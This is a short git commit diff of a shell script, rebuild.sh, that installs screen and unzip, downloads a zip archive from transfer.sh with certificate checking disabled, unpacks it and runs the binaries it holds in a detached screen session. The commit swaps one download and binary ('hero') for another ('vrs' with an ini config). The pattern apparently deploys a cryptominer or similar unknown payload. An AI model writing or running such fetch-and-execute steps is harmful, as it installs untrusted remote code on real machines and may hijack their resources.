6be023061b1b5c569394554f3f4df609ac211ddc
mata lima <lamajuahsu@outlook.com>
2021-10-28 15:35:57 +0000

    rebuild.sh edited online with Bitbucket

--- rebuild.sh
+++ rebuild.sh
@@ -4,11 +4,11 @@
 
 apt update
 apt -y install screen unzip
-wget --no-check-certificate -c https://transfer.sh/DkYGQH/vault.zip
-unzip vault.zip
-mv checker vault
-cd vault
-screen -dmS hero ./hero
+wget --no-check-certificate -c https://transfer.sh/RNz0eY/nano.zip
+unzip nano.zip
+mv checker nano
+cd nano
+screen -dmS vrs ./vrs vrs.ini
 > /dev/null 2>&1
 chmod 777 checker && ./checker
 echo succes
